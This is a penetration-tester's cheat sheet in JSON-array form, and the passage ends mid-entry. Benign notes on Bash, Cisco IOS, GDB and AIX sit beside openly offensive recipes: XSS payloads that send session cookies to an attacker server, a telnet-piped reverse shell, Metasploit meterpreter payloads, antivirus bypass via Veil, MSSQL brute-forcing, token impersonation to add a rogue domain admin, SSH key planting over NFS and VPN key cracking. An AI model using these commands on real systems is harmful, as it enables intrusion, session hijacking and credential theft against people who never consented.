[["AIXBuild", "oslevel", "Reports back on installed service pack, maintenance etc. levels of the AIX deployment. Most of these appear to return absolutely nothing or loads of information.\n\noslevel        (reports back the overall AIX version e.g. 6.1.0.0)\noslevel -q     (reports back known maintenance levels on the host)\noslevel -rq    (reports back known Recommended Maintenance Levels, think major releases)\noslevel -sq    (reports back known Service Packs - has returned a load of service pack numbers for me, these are useful when looking at products in relation to the service pack)\n\ne.g.\noslevel -s -g 6100-08-03-1339\n\n"], ["AIXBuild", "lslpp", "Displays information about installed filesets/software and updates. It's particularly useful when coupled with the information returned by itself\n\ne.g.\nlslpp -l         (lists all packages, most recent level and state of them)\nThe package names can be passed back to it for more info, showing their patch management/application cycle.\n\ne.g. \nlslpp -h bos.rte   - returns information regarding the updates applied to the Base Operating System package. bos.rte\n\n"], ["AIXBuild", "rpm", "Standard redhat package manager, has turned up on a few machines.\n\nrpm -qa \nrpm -qa --last\nThese will report back packages installed by rpm and when.\n\nOther than those, it's the same combination of looking through directories and permissions on files. I usually end up checking through with \"find\" and the \"-perm\" flag:\ne.g. find /home/ -perm 777\n"], ["ApacheSSL", "Enabling Self signed certificates on local website", "1. Install OpenSSL\n\nsudo apt-get install openssl\n\n2. Run the following command to generate the self signed SSL certificates:\n\nsudo openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/ssl/certs/server.crt -keyout /etc/ssl/private/server.key\n\n3. Enable SSL for Apache\n\nsudo a2enmod ssl\n\n4. Put the default-ssl site available creating a symbolic link\n\nsudo ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/000-default-ssl.conf\n\n5. Edit the file default-ssl.conf\n\nsudo nano /etc/apache2/sites-enabled/000-default-ssl.conf\n\nChange the following lines to point to the certs:\n\nSSLCertificateFile    /etc/ssl/certs/server.crt\nSSLCertificateKeyFile /etc/ssl/private/server.key\n\n6. Restart Apache\n\nsudo /etc/init.d/apache2 restart\n\nMore information:\nhttps://hallard.me/enable-ssl-for-apache-server-in-5-minutes/\nhttps://www.sslshopper.com/article-how-to-create-and-install-an-apache-self-signed-certificate.html\nhttp://www.akadia.com/services/ssh_test_certificate.html\nhttps://www.sslshopper.com/apache-server-ssl-installation-instructions.html\nhttp://www.emreakkas.com/linux-tips/invalid-command-sslengine-enabling-ssl-on-ubuntu-server"], ["AttackingMSSQL", "Enumerate MSSQL Servers on the network", "msf > use auxiliary/scanner/mssql/mssql_ping\nnmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156\nDiscover more servers using \"Browse for More\" via Microsoft SQL Server Management Studio.\n\n"], ["AttackingMSSQL", "Bruteforce MSSQL Database", "msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login\n\n"], ["AttackingMSSQL", "Enumerate MSSQL Database:", "msf > use auxiliary/admin/mssql/mssql_enum\n\n"], ["AttackingMSSQL", "Gain shell using gathered credentials", "msf > use exploit/windows/mssql/mssql_payload\nmsf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp\n\n"], ["AVBypass", "Bypassing an Anti-Virus", "1. Generate executable using Veil.\n\n2. In msfconsole setup psexec with relevant payload (windows/meterpreter/reverse_tcp)\n\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set RHOST 192.168.0.2\nRHOST => 192.168.0.2\nmsf exploit(psexec) > set SMBUser user\nSMBUser => user\nmsf exploit(psexec) > set SMBPass pass\nSMBPass => pass\nmsf exploit(psexec) > set EXE::Custom /root/Desktop/Misc/Veil-master/payload.exe\nEXE::Custom => /root/Desktop/Misc/Veil-master/payload.exe\nmsf exploit(psexec) > exploit"], ["BashScripting", "nano Shortcuts", "ctrl v\t\t\tNext page.\nctrl y\t\t\tPrevious page.\nctrl w\t\t\tWhere is (find).\nctrl k\t\t\tCut that line of test.\nctrl x     \t\tExit editor.\n\n"], ["BashScripting", "Create a text file:", "touch file\t\tCreates an empty file.\nifconfig > tmp\tpipe the output of a command\nnano file\n\n"], ["BashScripting", "Create a file and append text to it:", "ifconfig > tmp     \necho >> tmp\nping google.com -c3 >> tmp\n\n"], ["BashScripting", "How to view a file:", "cat file\t\tShow entire contents of file.\nmore file\t\tShow one page at a time.  Space bar for next page and (q) to exit.\nhead file\t\tShow the first 10 lines.\nhead -15 file\tShow the first 15 lines.\ntail file\t\tShow the last 10 lines.\ntail -15 file\tShow the last 15 lines.\ntail -f file\tUseful when viewing the output of a log file.\n\n"], ["BashScripting", "pipe", "cat tmp | grep Bcast\tFeeds the output of one process to the input of another process.\n\n"], ["BashScripting", "Processes", "ps aux\t\t\tShow all running process for all users.\nkill -9 PID\t\tNicely kill a PID.\n\n"], ["BashScripting", "Word Count", "wc -l tmp2\t\tCount the number of lines in a file\n\n"], ["BashScripting", "cut", "-d  delimiter\n-f  fields\n\n"], ["BashScripting", "sort", "Sort by unique\t\tsort -u file\nsort IP addresses correct\t\tsort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n\ncat tmp2 | cut -d '(' -f2 | cut -d ')' -f1 | sort -u\t\tIsolate the IP address\n\n"], ["BashScripting", "awk", "awk '{print $1}' file \t\tShow the 1st column.\nawk '{print $1,$5}' file \tShow the 1st and 5th columns.\n\n"], ["BashScripting", "grep", "grep -v\t\tRemove a single string.\ngrep -v 'red' file\n\n"], ["BashScripting", "egrep -v", "Remove multiple strings\tegrep -v '(red|white|blue)' file\n\n"], ["BashScripting", "sed", "sed 's/FOO/BAR/g' file \t\tReplace FOO with BAR.\nsed 's/FOO//g' file \t\tReplace FOO with nothing.\nsed '/^FOO/d' file \t\t\tRemove lines that start with FOO.\n\n"], ["BashScripting", "colour", "31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan \necho -e \"\\e[1;34mThis is a blue text.\\e[0m\"\n\n"], ["BashScripting", "Simple bash script:", "#!/bin/bash\nclear\necho\necho\nprint \"Hello world.\"\n\n"], ["BashScripting", "Make a file executable.", "chmod +x file\nchmod 755 file\n\n"], ["BashScripting", "Variables", "name=Bob\necho $name\nuser=$(whoami)\necho $user\necho 'Hello' $name. 'You are running as' $user.\n\n#!/bin/bash\nclear\necho \"Hello World\"\nname=Bob\nip=`ifconfig | grep \"Bcast:\" | cut -d\":\" -f2 | cut -d\" \" -f1`\necho \"Hello\" $name \"Your IP address is:\" $ip\n\n"], ["BashScripting", "User Input", "read -p \"Domain: \" domain\n\n#!/bin/bash\necho \"Please input your domain:\"\nread -p \"Domain:\" domain\nping -c 5 $domain\n\n"], ["BashScripting", "Check For No User Input", "if [ -z $domain ]; then\n\techo\n\techo \"#########################\"\n\techo\n\techo \"Invalid choice.\"\n\techo\n\texit\nfi\n\n"], ["BashScripting", "For loops", "#!/bin/bash\n\nfor host in $(cat hosts.txt)\ndo\n\tcommand $host\ndone\n\n"], ["BashScripting", "One Liners", "[>] Port Scan:\n    for port in $(cat Ports.txt); do nc -nzv 192.168.0.1 $port & sleep 0.5; done"], ["BuildReviews", "Main tasks", "Any third party installed software and all associated versions.\nPassword policy applied locally via net accounts commands.\nDomain policy applied, including domain password policy.\nLogging settings.\nRunning services and unquoted service paths.\nPermissions set on services.\nList of patches and hotfixes installed.\nEfficacy of AV solutions. May require import of a benign Eicar test file.\nUSB policy and removable media access (including firewire, CD etc).\nDisk encryption (if relevant)\nBIOS passwords set.\nProxy settings (if relevant).\nNessus Scan (With Credentials).\n\n"], ["BuildReviews", "Windows Hosts:", "- Server Roles\n- Server Manager\n- System Properties\n- Default Domain Policy\n- Global Domain Policy\n\n- Net accounts/Users/groups/Administrators\n- IPConfig/Routing\n\n- Installed Programs\n- Installed System Updates\n- AV Version/Definition Dates\n- Check Computer folders\n\n- Firewall Configuration\n- Audit Policy\n- Password/Lockout Policy\n- Security Policy\n- User Rights Policy\n\n- Lanman Parameters (HKLM - System - Current Control - Services - LanmanServer - Parameters)\n- LSA (HKLM - System - Current Control - Control - LSA)\n- MSV (HKLM - System - Current Control - Control - LSA - MSV1_0)\n\nsysteminfo command\n\nBIOS password\nboot to usb\nfile system\n- encrypted?\n- grab /Windows/System32/config/SAM SECURITY SYSTEM\n- put C:\\Program.exe (eg calc)\n\nControl Panel\n- Windows Firewall\n   - enabled\n   - editable\n   - logs\n- System Info\n- Windows Update\n\nAnti-Virus\n- config\n- logs\n- version\n- dates\n- EICAR\n\ncmd.exe\nscript.cmd\n- ipconfig /all\n- netstat\n- net accounts\n- net accounts /domain (review password policy)\n- net user hacker Password@1 /add\n- regedit\n- ping\n- sched\n- tracert\n- net use \\\\IP address_or_host name\\ipc$ \"\" /user:\"\"  # null session\n- net use\n- net view\n- net start \t\n- tasklist\n\nmount usb\nusb autostart\n\ncopy over files\n- nc\n- enum\n- nmap\n- DIRE\n- EICAR\n\n# SAM files in backtrack\n/Windows/System32/config/SAM SECURITY SYSTEM\n\n# mounting on desktop review\n# mount <target> <mydir>\n# sda1 = client hdd, sdb2 = my usb part 2\n# mkdir /mnt/client-hdd\n# mount /dev/sda1 /mnt/client-hdd\n# mkdir /mnt/win-usb\n# mount /dev/sdb2 /mnt/win-usb\n\nhosts file C:\\Windows\\System32\\drivers\\etc\\hosts.txt\n\nSYSVOL GPO preference item, check for obscured passwords in xml\nhttp://blogs.technet.com/b/grouppolicy/archive/2008/08/04/passwords-in-group-policy-preferences.aspx\n\nThe history file is readable by any authenticated user, as shown below:\nC:\\Users\\All Users\\Microsoft\\Group Policy\\History\\{A1C0C41B-D2F8-401B-A5D1-437DA197A809}\\Machine\\Preferences\\Groups\\Groups.xml\nThe same Group Policy Preference XML configuration file is also accessible via the following UNC path on the Domain Controller, again by any authenticated user:\n\\\\Domain_Controller\\sysvol\\Domain_Name\\Policies\\{A1C0C41B-D2F8-401B-A5D1-437DA197A809}\\Machine\\Preferences\\Groups\\Groups.xml\n\n"], ["BuildReviews", "Unix Based Hosts:", "hostname\nwhoami\nuname -a\ncat /etc/lsb-release\ndmesg | grep Linux\ncat /etc/passwd\ncat /etc/sudoers\nnetstat -antup\nps -aux\nps aux | grep root\ncrontab -l\n/sbin/ifconfig -a\niptables -L\narp -e\ncat ~/.bash_history\ncat ~/.ssh/authorized_keys\nmount\n\n- Check installed applications\n- Check installed compilers/interpreters"], ["CiscoIOS", "Verify Basic Configuration", "Shows information about the switch and its interfaces, RAM, NVRAM, flash, IOS, etc.\nSW1# show version\n\nShows the current configuration file stored in DRAM.\nSW1# show running-config\n\nShows the configuration file stored in NVRAM which is used at first boot process.\nSW1# show startup-config\n\nLists the commands currently held in the history buffer.\nSW1# show history\n\nShows an overview of all interfaces, their physical status, protocol status and ip address if assigned.\nSW1# show ip interface brief\n\nShows detailed information about the specified interface, its status, protocol, duplex, speed, encapsulation, last 5 min traffic.\nSW1# show interface vlan 1\n\nShows the description of all interfaces\nSW1# show interfaces description\n\nShows the status of all interfaces like connected or not, speed, duplex, trunk or access vlan.\nSW1# show interfaces status\n\nShows the public encryption key used for SSH.\nSW1# show crypto key mypubkey rsa\n\nShows information about the leased IP address (when an interface is configured to get IP address via a dhcp server)\nSW1# show dhcp lease\n\n"], ["CiscoIOS", "Router modes", "Router>: User mode = Limited to basic monitoring commands\nRouter#: Privileged mode (exec-level mode) = Provides access to all other router commands\nRouter(config)#: global configuration mode = Commands that affect the entire system\nRouter(config-if)#: interface mode = Commands that affect interfaces\nRouter(config-subif)#: subinterface mode = Commands that affect subinterfaces\nRouter(config-line)#: line mode = Commands that affect in lines modes (console, vty, aux\u00e2\u20ac\u00a6)\nRouter(config-router)#: router configuration mode\n\n"], ["CiscoIOS", "Changing switch hostname", "Switch(config)# hostname SW1\n\n"], ["CiscoIOS", "Configuring passwords", "SW1(config)# enable secret cisco    ! MD5 hash\nSW1(config)# enable password notcisco    ! Clear text\n\n"], ["CiscoIOS", "Securing console port", "SW1(config)# line con 0\nSW1(config-line)# password cisco\nSW1(config-line)# login\n\n"], ["CiscoIOS", "Securing terminal lines", "SW1(config)# line vty 0 4\nSW1(config-line)# password cisco\nSW1(config-line)# login\n\n"], ["CiscoIOS", "Encrypting passwords", "SW1(config)# service password-encryption\n\n"], ["CiscoIOS", "Configuring banners", "SW1(config)# banner motd $\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\nUNAUTHORIZED ACCESS IS PROHIBITED\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n$\n\n"], ["CiscoIOS", "Giving the switch an IP address", "SW1(config)# interface vlan 1\nSW1(config-if)# ip address 172.16.1.11 255.255.255.0    ! or DHCP\nSW1(config-if)# no shutdown\n\n"], ["CiscoIOS", "Setting the default gateway", "SW1(config)# ip default-gateway 172.16.1.1\n\n"], ["CiscoIOS", "Saving configuration", "SW1# copy running-config startup-config\nDestination filename [startup-config]?    ! Press enter to confirm file name.\nBuilding configuration\u00e2\u20ac\u00a6\n[OK]\n \n! Short for write memory.\nSW1# wr\nBuilding configuration\u00e2\u20ac\u00a6\n[OK]"], ["CookieStealing", "Cookie Stealing", "[-] Start Web Service\n\npython -m SimpleHTTPServer 80\n\n[-] Use one of the following XSS payloads:\n\n<script>document.location=\"http://192.168.0.60/?c=\"+document.cookie;</script>\n<script>new Image().src=\"http://192.168.0.60/index.php?c=\"+document.cookie;</script>"], ["CTF", "Enumerate Users via Finger", "finger user@192.168.0.20\n\n"], ["CTF", "Show nfs shares available", "showmount -e 192.168.1.54\n\n"], ["CTF", "User nfspysh to mount share and create .ssh directory", "nfspysh -o server=192.168.0.20:/home/user\nmkdir .ssh\ncd .ssh\n\n"], ["CTF", "Generate ssh key pair", "ssh-keygen\ncp id_rsa.pub /tmp/authorized_keys\n\n"], ["CTF", "Transfer attacker public key to host", "put /tmp/authorized_keys\nexit\n\n"], ["CTF", "Login to SSH server with no password", "SSH_AUTH_SOCK=0 ssh user@192.168.0.20\n\n\n\n\n"], ["DomainAdminExploitation", "After compromising a Windows machine", "[>] List the domain administrators:\nFrom Shell - net group \"Domain Admins\" /domain\n\n[>] Dump the hashes (Metasploit)\nmsf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE\n\n[>] Find the admins (Metasploit)\nspool /tmp/enumdomainusers.txt\nmsf > use auxiliary/scanner/smb/smb_enumusers_domain\nmsf > set smbuser Administrator\nmsf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nmsf > set rhosts 10.10.10.0/24\nmsf > set threads 8\nmsf > run\n\nmsf> spool off\n\n[>] Compromise Admin's box\nmeterpreter > load incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token MYDOM\\\\adaministrator\nmeterpreter > getuid\nmeterpreter > shell\n\nC:\\> whoami\nmydom\\adaministrator\nC:\\> net user hacker /add /domain\nC:\\> net group \"Domain Admins\" hacker /add /domain"], ["ExploitDev", "Fuzzing", "import socket\n\nbuffer = [\"A\"]\ncounter = 50\n\nwhile len(buffer) <= 1000:\n    buffer.append(\"A\" * counter)\n    counter = counter + 50\n\nfor buffstring in buffer:\n    print \"Fuzzing:\" + str(len(buffstring))\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect( (\"192.168.0.20\", 5555) )\n    sock.send(buffstring)\n    sock.close()\n\n"], ["ExploitDev", "Bad Character Testing", "\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\"\n\"\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\"\n\"\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\"\n\"\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\"\n\"\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\"\n\"\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\"\n\"\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\"\n\"\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\"\n\"\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\"\n\"\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\"\n\"\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\"\n\"\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\"\n\"\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\"\n\"\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\"\n\"\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\"\n\"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\"\n\"\\xff\"\n\n"], ["ExploitDev", "Structured Exception Handler (SEH) Exploitation notes", "- Crash the application\n- Check SEH overwirte (view-seh chain)\n- Find offset (!mona pattern_create <length>)\n- Find certain SEH references to the cyclic pattern (!mona findmsp)\n- Verify offset to NSEH (Next Exception)\n- Find POP/POP/RET address with mona (!mona seh -cpb <bad chars>)\n- Add short jump into payload to jump ofver SEH (\"\\xeb\\x06\" + 2 bytes of padding)\n- Add shellcode to the payload\n- Ensure existing padding to make sure the crash still happens."], ["GDB", "Set disassembly flavor", "set disassembly-flavor intel\n\n"], ["GDB", "Set alias", "$ cat ~/.bash_aliases | grep gdb\nalias gdb='gdb -quiet'\n\n"], ["GDB", "Running GDB", "$ gdb        \t\t- run, then use file command to load object \n$ gdb -quiet        - supress copyright information\n$ gdb object      \t- normal debug \n$ gdb object core \t- analyze core dump\n$ gdb object pid  \t- attach to running process\n\n"], ["GDB", "GDB Commands", "set args                        - set program arguments\nshow args                       - show program arguments\nrun                             - run the program\nrun < file                      - run with input from file\nset follow-exec-mode new/sam    - set debugger response to an exec call\nset write                       - set write into executables\nset write off                   - unset write int oexecutables \ncontinue                        - continue running until break\nfinish                          - execute until current stack frame ends\nsource FILE                     - read commands from script file\nshell  [cmd]                    - run cmd in a shell\ndisplay /5i $eip                - display expression everytime execution stops\nundisplay <expr #>              - undisplay expression number\ninfo functions                  - list all the functions\ninfo variables                  - list all the variables\ninfo registers                  - list most common registers\ninfo all-registers              - list all registers\ninfo display                    - print the list of displayed expressions\nbacktrace                       - print backtrace of all stack frames\nwhere                           - same as backtrace\nset disassembly-flavor intel    - set disassembly style to intel/att\ndefine hook-[cmd]               - actions to execute before command\ndefine hooopost-[cmd]           - actions to execute after command\ndefine hook-stop                - actions to execute when execution stops\n\n"], ["GDB", "GDB Using brakepoints", "info breakpoints                - list all breakpoints\nbreak [func]                    - break function name\nbreak *[addr]                   - break at address\ndelete [bnum]                   - delete breakpoint bnum\nbreak if [cond]                 - break if condition\nignore [bnum] [count]           - ignore breakpoint bnum count times\ncondition [bnum] $eax == 0x22   - add condition for breakpoint 1\ncondition [bnum]                - delete condition for breakpoint 1\n\n"], ["GDB", "GDB Using watchpoints", "info watchpoints                - list all the watchpoint\nwatch variable==value           - break when variable equals ..\nwatch $eax == 0x0000ffaa        - break when register equals ..\nrwatch *[addr]                  - break on read memory location\nawatch *[addr]                  - break on read/write memory location"], ["GPG", "Encryot", "sudo gpg -e ~/Desktop/file.doc\n\nThis will prompt you to type in the persons name (public key) to encrypt with.\n\n"], ["GPG", "Decrypt", "sudo gpg -d ~/Desktop/file.doc.pgp > ~/Desktop/file.doc\n\n"], ["GPG", "Import other user's keys", "sudo gpg --import <key>"], ["HTTPBasicAuth", "HTTP Basic Authentication Dictionary and Brute-force attacks with Burp Suite", "http://www.dailysecurity.net/2013/03/22/http-basic-authentication-dictionary-and-brute-force-attacks-with-burp-suite/\n\nBurp Suite against HTTP Basic authentication\n\nTo implement the attack you need to capture one authentication request with Burp Proxy and send it to Burp Intruder.\n\nMark only the Base64 encoded string and click Add button to put the markers around it.\n\n"], ["HTTPBasicAuth", "BurpSuite: Dictionary attack", "For the dictionary attack I\u00e2\u20ac\u2122m using custom iterator intruder option. It allows you to generate your own custom payload string consisting from several substrings. For every substring you could specify separator which is basically e suffix. The Intruder calls those substrings \"positions\".\nFollowing this logic in position 1 we would like to load an username followed by separator semicolumn and then load password for position 2.\nGo to Payload tab and select Custom iterator option from Payload type dropdown box.\nBurp Suite Custom Iterator\nSelect position 1 from the Position dropdown box and load your usernames list in List items for position 1 listbox. Put semicolumn in the Separator for position 1 text box.\nPosition 1 list and separator option\nSelect position 2 from the Position dropdown box and load your passwords list in List items for position 2 listbox.\nPosition 2\nAfter you\u00e2\u20ac\u2122ve set your two positions you need to tell the Intruder to encode the payload string using Base64 encoding. Go to Payload processing sections and click Add button. Select Payload encoding option and then Base64.\nPayloadProcessin_AddRule_Encode\nPayloadProcessingEncode\nBy default Burp Intruder URL encodes the payload. Base64 strings often contain = symbol. That is why it is a good idea to exclude it from the list of URL characters for encoding.\nThat\u00e2\u20ac\u2122s it. You can start the Intruder attack.\n\n"], ["HTTPBasicAuth", "BurpSuite: Bruteforce attack", "The method I\u00e2\u20ac\u2122m using for the bruteforce attack is targeting only one username per Intruder attack.\nSelect Brute forcer from the Payload type dropdown and then set the length of the password and the characterset you would like the Intruder to use while constructing the password strings.\nBurp Intruder Brute forcer\nIn order to specify the username you would like to brute-force you need to set Payload processing rule. Add new rule with Add prefix type and fill up the username followed by semi-column.\nBurp Intruder Add Prefix\nAdd another rule to encode the payload using Base64. And finally remove = from the list of symbols subject of URL encoding.\nBurp Sutei Bruteforce Attack Settings\nDone! You can start the Intruder attack!\n\n"], ["HTTPBasicAuth", "Automated Security Analyser for ASP.NET Websites", "https://asafaweb.com"], ["IKEScan", "Aggressive Mode VPN -- IKE-Scan, PSK-Crack", "In IKE Aggressive mode the authentication hash based on a preshared key (PSK) is transmitted as response to the initial packet of a vpn client that wants to establish an IPSec Tunnel (Hash_R). This hash is not encrypted. It's possible to capture these packets using a sniffer, for example tcpdump and start dictionary or brute force attack against this hash to recover the PSK.\n\nThis attack only works in IKE aggressive mode because in IKE Main Mode the hash is already encrypted. Based on such facts IKE aggressive mode is not very secure.\n\nIt looks like this:\n\n$ ike-scan 192.168.207.134\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n\n192.168.207.134 Notify message 14 (NO-PROPOSAL-CHOSEN) HDR=(CKY-R=f320d682d5c73797)\nEnding ike-scan 1.9: 1 hosts scanned in 0.096 seconds (10.37 hosts/sec).\n0 returned handshake; 1 returned notify\n\n----------------------------------------------------------------------------------------------------------------------------------\n\n$ sudo ike-scan -A 192.168.207.134\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ikescan/)\n\n192.168.207.134 Aggressive Mode Handshake returned HDR=(CKY-R=f320d6XXXXXXXX) SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=12f5f28cXXXXXXXXXXXXXXX (Cisco Unity) VID=afcad71368a1XXXXXXXXXXXXXXX(Dead Peer Detection v1.0) VID=06e7719XXXXXXXXXXXXXXXXXXXXXX VID=090026XXXXXXXXXX (XAUTH) KeyExchange(128 bytes) ID(Type=ID_IPV4_ADDR, Value=192.168.207.134) Nonce(20 bytes) Hash(16 bytes)\n\n----------------------------------------------------------------------------------------------------------------------------------\n\nTo save with some output:\n\n$ sudo ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key\n\nOnce you have you psk file to crack you're stuck with two options psk-crack and cain\n\n"], ["IKEScan", "Brute force", "$psk-crack -b 5 192-168-207-134key\nRunning in brute-force cracking mode\nBrute force with 36 chars up to length 5 will take up to 60466176 iterations\n\nno match found for MD5 hash 5c178d[SNIP]\nEnding psk-crack: 60466176 iterations in 138.019 seconds (438099.56 iterations/sec)\n\nDefault is charset is \"0123456789abcdefghijklmnopqrstuvwxyz\" can be changed with --charset=\n\n$ psk-crack -b 5 --charset=\"01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" 192-168-207-134key\nRunning in brute-force cracking modde\nBrute force with 63 chars up to length 5 will take up to 992436543 iterations\n\n"], ["IKEScan", "Dictionary attack", "$psk-crack -d /path/to/dictionary 192-168-207-134key\nRunning in dictionary cracking mode\n\nno match found for MD5 hash 5c178d[SNIP]\nEnding psk-crack: 14344876 iterations in 33.400 seconds (429483.14 iterations/sec)"], ["LinuxPrivilegeEsc", "Info", "Enumeration is the key.\n(Linux) privilege escalation is all about:\nCollect - Enumeration, more enumeration and some more enumeration.\nProcess - Sort through data, analyse and prioritisation.\nSearch - Know what to search for and where to find the exploit code.\nAdapt - Customize the exploit, so it fits. Not every exploit work for every system \"out of the box\".\nTry - Get ready for (lots of) trial and error.\n\n"], ["LinuxPrivilegeEsc", "Operating System", "What's the distribution type? What version?\ncat /etc/issue\ncat /etc/*-release\n   cat /etc/lsb-release\n   cat /etc/redhat-release\n\n"], ["LinuxPrivilegeEsc", "What's the Kernel version? Is it 64-bit?", "cat /proc/version   \nuname -a\nuname -mrs \nrpm -q kernel \ndmesg | grep Linux\nls /boot | grep vmlinuz-\n\n"], ["LinuxPrivilegeEsc", "What can be learnt from the environmental variables?", "cat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\nenv\nset\n\n"], ["LinuxPrivilegeEsc", "Is there a printer?", "lpstat -a\n\n"], ["LinuxPrivilegeEsc", "Applications & Services", "What services are running? Which service has which user privilege?\nps aux\nps -ef\ntop\ncat /etc/service\n\n"], ["LinuxPrivilegeEsc", "Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!", "ps aux | grep root\nps -ef | grep root\n\n"], ["LinuxPrivilegeEsc", "What applications are installed? What version are they? Are they currently running?", "ls -alh /usr/bin/\nls -alh /sbin/\ndpkg -l\nrpm -qa\nls -alh /var/cache/apt/archivesO\nls -alh /var/cache/yum/\n\n"], ["LinuxPrivilegeEsc", "Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?", "cat /etc/syslog.conf \ncat /etc/chttp.conf\ncat /etc/lighttpd.conf\ncat /etc/cups/cupsd.conf \ncat /etc/inetd.conf \ncat /etc/apache2/apache2.conf\ncat /etc/my.conf\ncat /etc/httpd/conf/httpd.conf\ncat /opt/lampp/etc/httpd.conf\nls -aRl /etc/ | awk '$1 ~ /^.*r.*/ \n\n"], ["LinuxPrivilegeEsc", "What jobs are scheduled?", "crontab -l\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\n\n"], ["LinuxPrivilegeEsc", "Any plain text usernames and/or passwords?", "grep -i user [filename]\ngrep -i pass [filename]\ngrep -C 5 \"password\" [filename]\nfind . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\"   # Joomla \n\n"], ["LinuxPrivilegeEsc", "Communications & Networking", "What NIC(s) does the system have? Is it connected to another network?\n/sbin/ifconfig -a\ncat /etc/network/interfaces\ncat /etc/sysconfig/network \n\n"], ["LinuxPrivilegeEsc", "What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?", "cat /etc/resolv.conf\ncat /etc/sysconfig/network\ncat /etc/networks\niptables -L\nhostname\ndnsdomainname\n\n"], ["LinuxPrivilegeEsc", "What other users & hosts are communicating with the system?", "lsof -i \nlsof -i :80\ngrep 80 /etc/services\nnetstat -antup\nnetstat -antpx\nnetstat -tulpn\nchkconfig --list\nchkconfig --list | grep 3:on\nlast\nw\n\n"], ["LinuxPrivilegeEsc", "Whats cached? IP and/or MAC addresses", "arp -e\nroute\n/sbin/route -nee\n\n"], ["LinuxPrivilegeEsc", "Is packet sniffing possible? What can be seen? Listen to live traffic", "# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]\ntcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21\n\n"], ["LinuxPrivilegeEsc", "Have you got a shell? Can you interact with the system?", "# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/\nnc -lvp 4444    # Attacker. Input (Commands)\nnc -lvp 4445    # Attacker. Ouput (Results)\ntelnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!\n\n"], ["LinuxPrivilegeEsc", "Is port forwarding possible? Redirect and interact with traffic from another view", "# rinetd\n# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch\n\n# fpipe\n# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]\nFPipe.exe -l 80 -r 80 -s 80 192.168.1.7\n\n# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]\nssh -L 8080:127.0.0.1:80 